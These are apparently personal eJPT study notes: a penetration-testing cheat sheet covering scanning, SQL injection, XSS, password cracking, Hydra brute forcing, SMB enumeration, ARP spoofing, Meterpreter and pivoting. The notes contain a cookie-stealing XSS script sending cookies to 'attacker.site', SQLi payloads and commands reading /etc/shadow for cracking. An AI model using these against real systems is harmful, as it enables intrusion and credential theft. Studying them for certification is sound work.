##eJPT##


Information Gathering::
	
	Open-Source Intelligence:
		-CrunchBase
		-GSA eLibrary
		-sysinternal's whois
		-Facebook
		-Linkedin
		-Twitter

	Sub-Domain Enumeration:
		-dnsdumpster.com
		-google dorking: site: <site>.com
		-sublist3r(cli)
		-amass
		-VirusTotal(search)
		-crt.sh


Scanning & Footprinting::
	
	ping sweep:
		-nmap -sn x.x.x.x-y
		-fping -a -g -m -A -q x.x.x.x-y  (2>/dev/null to send to stderr.)

	OS Fingerprinting:
		-nmap -Pn(to skip alive-test) -O(OS Scan) <target>
		-netcat into port

	Firewall Spotting:
		-'tcpwrapped'
		-nmap --reason
		-RST sent while in handshake
	
	nmap flags:
		no flag/sS - SYN Scan
		sn - Ping Scan
		sT - TCP Scan
		sV - Service Scan

	masscan:
		Pn - Every Machine
		--rate=<num> - num represent packets sent per second
		--banners - grab banners
		IF THROUGH VPN:
			-e <NIC-ID> --router-ip <NIC IP>
		MAKE CONFIG FILE:
			--echo > <file>.conf
			masscan -c <file>.conf

Vulnerability Assessment:
	Engagement -> Information Gathering -> Footprinting & Scanning -> Vulnerability Assessment -> Reporting
	No active exploitation, POC on paper

	Nessus:
		systemctl start nessusd / /etc/init.d/nessusd start
		login:
			user: v4rd1
			pass: 2
			
	
Web Attacks:
	netcat:
		nc <Address> <port>
		HEAD / HTTP/1.0
		nc flags:
			l - listen
			v - verbose
			p - port
			u - UDP
			e - execue given command (/bin/bash etc.)

	OpenSSL(https):
		openssl s_client -connect target.site:443
		HEAD / HTTP/1.0

	HTTP Verbs:
		GET - Request a page
		ex. GET /page.php?<arg>=? HTTP/1.1
			HOST: www.ex.com

		POST - Submit HTML form data
			POST /page.php HTTP/1.1
			HOST: www.ex.com

			username=username&password=password
		HEAD - Same as get but grabs headers only from response

		PUT - upload a file to the server
			PUT path/to/destination HTTP/1.1
			HOST: www.ex.com

			<PUT DATA>

		DELETE - Delete a file from the server
			DELETE path/to/destination HTTP/1.1
			HOST: www.ex.com

		OTIONS - Query the server for verbs
			OPTIONS / HTTP/1.1
			HOST: www.ex.com

	wget:
		download a file - wget -O <output> <HTTP://FILE/LOCATION>

	Dir/File Enumeration:
		dirb:
			default - dirb http://<site>/
			wordlist - dirb http://<site>/ wordlist/path
			user-agent - dirb http://<site>/ -a "<useragent>"
			listen through port(burp etc.) - dirb http://<SITE IP>/ -p http://localhost:8080
			with creds - dirb http://site/protected-folder -u user:pass

		gobuster:
			gobuster dir -u <URL> -w <wordlist> -U (*AUTH-USER) -P (*AUTH-PASS) -e(use full address)

		mysql:
			mysql -h <IP> --user='' --password=''
	
	Google Hacking:
		site: - include only result from hostname
		intitle: - filter according to title
		inurl: similar to intitle but works on the URL
		filetype: filter for extension
		AND/&,OR/| - logical operators
		'-' - filter out a keyword
	
	Cross-Site Scripting(XSS):
		unfiltered user-input to build the output content
		Reflected:
			Payload is carried INSIDE THE REQUEST that the browser sends.
			Activated by clicking on a sent link
			ex. http://victim.com/search.php?find=<payload>
		Persistent:
			Payload is stored in the website's page
			Activated by getting the page
			ex. Form submit in bulletin boards
		Cookie Stealing:
			<script> var i = new Image(); i.src="http://attacker.site/get.php?cookie="+escape(document.cookie)</script>
	
	SQL Injection(SQLi):
		SQL BASICS:
			SELECT:: SELECT <column> FROM <table> WHERE <condition>;
			UNION:: <SELECT STATEMENT> UNION <other SELECT STATEMENT>;
			COMMENTS:: SELECT field FROM table; # comment
					   SELECT field	FROM table; -- also a comment
			PHP:
				$dbhostname = '1.2.3.4';
				$dbuser = 'user';
				$dbpassword = 'pass';
				$dbname = 'database';

				$connection = mysqli_connect($dbhostname, $dbuser, $dbpassword, $dbname);
				$query = "SELECT Name, Description FROM Products WHERE ID='3' UNION SELECT Username, Password FROM Accounts;";

				$results = mysqli_query($connection, $query);
				display_results($results);

			Vulnerable Dynamic Query ex. :: $id = $_GET['id'];
				looks like:
					SELECT name, description FROM products WHERE ID='$id';
				vuln:
					' OR 'a'='a
					SELECT name, description FROM products WHERE ID='' OR 'a'='a;
					(SECOND OR WILL MATCH AND RUN)
				other ex:
					' UNION SELECT Username, Password FROM Accounts WHERE 'a'='a;
					looks like:
						SELECT name, description FROM products WHERE ID='' UNION SELECT Username, Password FROM Accounts WHERE 'a'='a

			User Input:
				-GET Parameters
				-POST Parameters
				-HTTP Headers:
					User-Agent
					Cookie
					Accept
					...
				**EVERY INPUT SHOULD BE TESTED!** -- **ONE TEST AT A TIME!**
				TESTING:
					String terminators- ' and "
					SQL Commands- UNION, SELECT, etc.
					SQL Comments- # or --

			SQL functions:
				user() - returns current db-username
				substring() - returns a substring of a given arguments (requires the input string, position, length)

			Iterate over letters:
				' or substr(user(), 1, 1)= 'a
				' or substr(user(), 1, 1)= 'b
				' or substr(user(), 1, 1)= 'c
				...
				will return 0 or 1 (True/False).
				Then move to second character:
					' or substr(user(), 2, 1)= 'a
					' or substr(user(), 2, 1)= 'b
					...
			UNION Based:
				SELECT Description FROM items WHERE id='' UNION SELECT user(); -- -';
				Iterate for field number:: ' UNION SELECT 'field1', 'field2', ...; -- -

			SQLMap:
				sqlmap -u <URL> -p <Injection Parameter> [options]
				--technique - UNION/BLIND/?
				--data=<POST STRING>(BURP)
				-v3 --fresh-queries - shows which payload was used by SQLMap
				--os-shell - try to get shell
				--users - which users are connected to the dbs
				--dbs - which databases exist
				Enumerate database:
					-D <database> --tables
					-D <database> -T <table> --columns
					-D <database> -T <table> -C <column/s> --dump
				/w Burp:
					sqlmap -r request.req -p user --banner/--dbs
					-OR-
					--data="user='a&password=a" -p user...

System Attacks:
	Wordlists - apt-get install seclists

	John The Ripper:
		john --list=formats - list all hashing formats that john is capable of cracking
		unshadow passwd shadow > crackfile
		Incremental Crack - john --incremental -users:<user> crackfile
		Show found passwords - john --show crackfile
		Dictionary Attack - john -wordlist=rockyou.txt crackfile

	Hashcat:
		Flags:
		-b - bechmark hashes per second
		-d - OpenCL device to use
		-O - Optimize performance

	Buffer Overflow:
		Buffers:
			buffer = an area in the computer's RAM reserved for temp. data storage, such as:
				-User Input
				-Parts of a video file
				-Server banners received by a client app
				-etc.
			Buffers have a finite size, means they could only contain a certain amount of data.
			for example if a client-server application is designed to accept only 8 characters long usernames, the username buffer will be 8 bits long.
			Now, if the developer of the application does not enforce buffers limits, an attacker could find a way to
			write data beyond those limits, thus actually writing arbitrary code in the RAM,
			which could be exploited to get control over the program's execution flow.

		The Stack:
			Buffers are stored in a data structure in the memory called a stack.
			A stack is a data structure used to store data.
			Works in a "LIFO" approach, Last in first out. means that you can only add to the top or remove from the top.
			adding or removing is done with two methods:
				Push - adds an element to the stack
				Pop - removes the last inserted element

		Pointers:
			A variable that holds a memory address. This address is the location of another object in memory.
			

Network Attacks:
	Hydra -L users.txt -P passwords.txt <service://server> <options>
	Telnet:
		hydra -L users.txt -P pass.txt telnet://target.server
	FTP:
		hydra -L users.txt -P pass.txt ftp://target.server
	HTTP Basic Auth:
		hydra -L users.txt -P pass.txt http-get(-or- post)://target.web
		hydra target.site http-get/post-form "/login.php:^USER^&^PASS^:invalid credentials" -L users.txt -P pass.txt
	SSH File Transfer:
		ssh user@IP 'cat /etc/passwd' > ./passwd.txt
		ssh user@IP 'cat /etc/shadow' > ./passwd.txt
	SSH Login:
		use auxiliary/scanner/ssh/ssh_login
		To Crack:
			unshadow passwd.txt shadow.txt > crackme
			john crackme

	Shares:
		UNC Paths:
			C$/D$... - lets an administrator access a volume, every volume has a share
			admin$ - points to the windows installation directory
			ipc$ - used for inter-process communication. Cannot be browsed via windows explorer
			\\localhost\<share>

		Null Session:
			NbtStat - nbtstat -A <IP> - displays information about the target
				UNIQUE - one IP assigned
				<20> - Share is up
			Enumerate Shares:
				NET VIEW <TARGET IP>
			On Linux:
				nmblookup -A <IP> - displays information about the target
				smbclient -L //<IP> -N (-L whats service is available -N no password)

			Checking for Null Sessions:
				NET USE \\<IP>\IPC$ '' /u:'' ('' empty password /u:'' empty username)
			On Linux:
				smbclient //<IP>/IPC$ -N 
			enum:
				-S - enumerate shares
				-U - enumerate users
				-P - check password policy
			winfo:
				winfo <IP> -n
			enum4linux:
			 enumlinux <IP> -n - same as nbtstat
			 -P - check password policy
			 -S - enumerate shares
			 -s /usr/share/enum4linux/share-list.txts
			 -a - all

			samrdump:
				/usr/share/doc/python-impacket-doc/examples/samrdump.py
			nmap:
				--script=smb-enum-shares
				--script=smb-enum-users
				--script=smb-brute
			smbclient:
				GET LIST OF SHARES - smbclient -L WORKGROUP -I <IP> -N -U ""
				ACCESS SHARE - smbclient \\\\<IP>\\<SHARE> -N

	ARP POISONING:
		Manipulate ARP Cache to recieve traffic destined to other IPs
		Arpspoof:
			Enable IP Forwarding - echo 1 > /proc/sys/net/ipv4/ip_forward
			arpspoof -i <interface> -t <target> -r <lhost>
			Intercept traffic on Wireshark

	Metasploit:
		msfupdate
		service postgresql start
		exploit/windows/local/persistence

		Meterpreter:
			search meterpreter - search for meterpreter payloads
			sysinfo - system information
			ifconfig - ...
			route
			getuid
			getsystem
				try - 
					post/windows/gather/win_privs
					exploit/windows/local/bypassuac
			post/windows/gather/hashdump - dump hashes
			download
			upload
			migrate:
				ps -U SYSTEM
				migrate to svchost, winlogon etc.
			
			Brute SSH:
				use auxiliary/scanner/ssh/ssh_login
	
	Pivotting:

		meterpreter:
			portfwd add -l <attacker port> -p <victim port> -r <victim ip>
			portfwd add -l 3306 -p 3306 -r 192.168.222
			run autorute -s <IP>

		ssh <gateway> -R <remote port to bind>:<local host>:<local port>


		Windows:
			route ADD 192.168.35.0 MASK 255.255.255.0 192.168.0.2
			plink(Reverse SSH):
				/usr/share/windows-binaries/plink.exe
				plink.exe -N -L 192.168.92.138:8000:192.168.92.128:8000 root@192.168.92.128
				plink.exe -N -L 192.168.92.138:8000:192.168.92.128:22 root@192.168.92.128
				On Target: plink.exe ip -P 22 -C -N -D 1080 -l KALIUSER -pw PASS

			

		Linux:
			ip route show/list
			route add default gw 192.168.1.254 eth0 (if route command present)
			ip route add default gw 192.168.1.254 eth0 (if ip command present)
			up route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.254 (?)

		**ip route add <ROUTETO>/24 via <ROUTEFROM>(Gateway)**

    File Search:
	dir /s /b <filename>
